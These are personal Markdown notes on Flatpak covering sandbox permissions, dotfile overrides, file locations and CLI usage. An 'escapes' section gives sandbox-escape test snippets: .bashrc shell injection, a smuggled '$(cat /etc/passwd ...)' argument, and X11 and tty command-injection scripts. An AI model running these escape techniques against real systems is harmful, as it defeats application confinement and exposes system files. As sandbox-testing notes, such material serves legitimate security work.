# LINKS

- Flatpak Is Not the Future:
  https://ludocode.com/blog/flatpak-is-not-the-future
- https://www.youtube.com/watch?v=faqQuJkqCIA&t=1347s
- https://tesk.page/2021/02/11/response-to-flatkill-org/
- https://tesk.page/2022/05/16/response-to-flatpak-is-not-the-future/
- https://conf.tube/w/qWLp5vosZg1V7vmZhmn5wM?start=26m49s
- FOSDEM: Flatpak and your distribution:
  https://www.youtube.com/watch?v=faqQuJkqCIA&t=1347s
- All Systems Go! 2017 Portals, dynamic permissions in Flatpak:
  https://www.youtube.com/watch?v=4569sjVer54
- Flatpak, an introduction (Lightning Talk) - Alexander Larsson Linux App Summit:
  https://www.youtube.com/watch?v=0yeXTounX3E&t=252s


# BASICS

* decentralized (even though we have a famous *Flathub* portal)
* flatpak packages do not get updated automatically (if you have Flatpak integration with the software center, you will be notified of available updates, but it will not be forcefully updated.)
* **rootless install**: does not need admin privileges to install applications
* **sandboxed applications**: comes with sandboxing enabled by default (using the Kernel's *namespaces* feature)
* **delta updates**: only changed files are downloaded for updates

# SANDBOX

- https://docs.flatpak.org/en/latest/sandbox-permissions.html
- a flatpak app cannot see my other Flatpak apps’ configurations by default, even with `filesystem=host`, meaning it will be much harder for one app to tamper with other apps’ data and read from them.

**static permissions:** 
- holes in the sandbox
- managed by `flatpak override`

**dynamic permissions:**
- granted by the users when applications run
- rely on resource providers called [Portals](https://github.com/flatpak/flatpak/wiki/Portals)
- managed by `org.freedesktop.impl.portal.PermissionStore`
- can require user confirmation
- e.g. users can grant access to _one_ specific file thanks to the `org.freedesktop.portal.FileChooser` portal

The applications sandboxed with flatpak are GUI applications, and, as most of GUI applications, they DO NOT NEED to write in system folders; going back to the OP question, Firefox and Thunderbird do not require to write anything in the system folders.

Sandboxing is here to prevent writing in the system folders, even if there is a security breach in the application itself and if that security breach is exploited. 

GUI Applications needing to write on system folders, commands, and CLI applications can be sandboxed using **Firejail**, **AppArmor** or **Systemd** sandboxing. If they need to access to some system folders, the sandboxing will allow it, but will reduce the system files write access to the required minimum.

## fs access

Flatpak apps mit `home` oder `host` Zugriff können ihre eigenen configs überschreiben. Das ist bekannt und die Entwickler wollen nichts dagegen tun.

### prevent access to dotfiles

```bash
cat > ~/.local/share/flatpak/overrides/global <<EOF
[Context]
filesystems=!~/.*
EOF
```

Damit kann keine Flatpak mehr automatisch auf deine dotfiles zugreifen, inklusive `~/.local/share/flatpak/overrides` (wo sie ihre configs ändern könnten)

## default

By default, applications that are run with Flatpak have extremely limited access to the host environment. This includes:

- No access to any host files except the runtime, the app, `~/.var/app/$FLATPAK_ID`, and `$XDG_RUNTIME_DIR/app/$FLATPAK_ID`. Only the latter two being writable.
- No access to the network.
- No access to any device nodes (apart from `/dev/null`, etc).
- No access to processes outside the sandbox.
- Limited syscalls. For instance, apps can’t use nonstandard network socket types or ptrace other processes.
- Limited access to the session D-Bus instance - an app can only own its own name on the bus.
- No access to host services like X11, system D-Bus, or PulseAudio.

Most applications will need access to some of these resources in order to be useful. This is primarily done during the finishing build stage

## mode

In **interactive mode** (under user control), flatpaks can write everywhere the user can (it is not a problem, since it is the user who chooses where to write)

In **unattended mode**, without user control, write access  to user files can be reduced; as an example, Firefox reduces the write access in unattended mode to the Downloads directory. 

## flatseal

- https://github.com/tchx84/Flatseal/blob/master/DOCUMENTATION.md

## escapes

### test

Since the objective is to simulate a successful code execution exploit within the confined application, we use the debug feature of flatpak to get a shell inside the runtime environment.

```sh
flatpak run --command=sh <APPID>
```

Using the resulting shell we try to get unconfined code execution from within the sandbox.

### fs injection

Writing an arbitrary command to a configuration file inside the user $HOME that will result in code execution. Using .bashrc here to spawn a new unconfined shell by adding `xterm -e sh`. This will be executed the next time a bash shell is executed in the users context.

```sh
# scriptinjection.txt
## example of why shell argument filtering is important
script.sh mimi$(cat /etc/passwd > pw.txt)
```

### x11 injection

Writing to the X11 socket to escape the sandbox through a unconfined X11 application using:

```sh
#!/bin/bash
# X11Injection.sh

## howto: enter the name of target application as argument
## e.g.
## ./X11Injection.sh xterm

windowid=$(xdotool search --class $1)
xdotool windowactivate --sync $windowid type --delay 100 'cat /etc/passwd'
xdotool windowactivate --sync $windowid key --delay 100 Return
```

### tty injection

Writing to a user owned virtual terminal (tty) at /dev/ttyX using:

```sh
#!/bin/bash
# ttyInjection.sh

## inject command in tty3
setsid sh -c 'exec ls -l <> /dev/tty3 >&0 2>&1' # list files
setsid sh -c 'exec touch ~/test.txt <> /dev/tty3 >&0 2>&1' # create file
```

## portals

Portals are automatically in use as soon as the app developer upgrades to a version of the toolkit or framework wherein support of the portal is included, therefore being transparent.

# FILES

```sh
# installations
ll /var/lib/flatpak # system
ll ~/.local/share/flatpak # user

# size
sudo du /var/lib/flatpak/ -sh # check size system
du ~/.local/share/flatpak -sh # check size user
```

## overrides

```sh
# overrides
ll ~/.local/share/flatpak/overrides
```
## desktop files

```sh
ll /var/lib/flatpak/exports/share/applications/
```

## add to PATH

```sh
# Add flatpak exports to path (issue: exports are named like com.spotify.Client)
nano ~/.profile
PATH="$PATH:/var/lib/flatpak/exports/bin/:~/.local/share/flatpak/exports/bin/"
```

```sh
# Create a symlink in a folder already in your PATH to the desired command name to the flatpak export in order to avoid getting tab completions with a bunch of org and com commands:
ln -s /var/lib/flatpak/exports/bin/com.visualstudio.com $HOME/.local/bin/code
```

# SYSTEM vs USER

Flatpak commands can be run either system-wide or per-user. Applications and runtimes that are installed system-wide are available to all users on the system. Applications and runtimes that are installed per-user are only available to the users that installed them. 

Flatpak commands are run **system-wide by default**. 

```sh
flatpak install --user org.videolan.VLC
```

```sh
# switch your flatpaks to your /home partition
flatpak remote-add --user flathub https://flathub.org/repo/flathub.flatpakrepo # add the flatpak --user repo
```

# CLI

## remotes

```sh
flatpak remotes # list the remotes that you have configured on your system
flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo # add the Flathub repo
flatpak remote-delete flathub
flatpak remotes --show-details
```

## install

```sh
flatpak install flathub org.videolan.VLC # 'flathub' is the remote repo the application is to be installed from
flatpak install flathub org.gimp.GIMP
flatpak install gimp # since version 1.2, the install cmd can search for applications

flatpak install --user # user installation
flatpak install --from https://dl.flathub.org/repo/appstream/org.qgis.qgis.flatpakref
```

```sh
flatpak uninstall --unused # remove runtimes and extensions that are not used by installed applications
```

## list

```sh
flatpak list # list the applications and runtimes you have installed
flatpak list --app # just list installed applications
flatpak list --runtime #
flatpak list --columns 
flatpak list --runtime --columns=name,size
flatpak list --app --columns=size,name | sort -g
flatpak list --runtime  --columns=size,name,branch | sort -g
```

## other cmds

```sh
flatpak search gimp
flatpak run org.gimp.GIMP
flatpak update
flatpak history
flatpak info --show-location io.github.quodlibet.QuodLibet # show install path
```

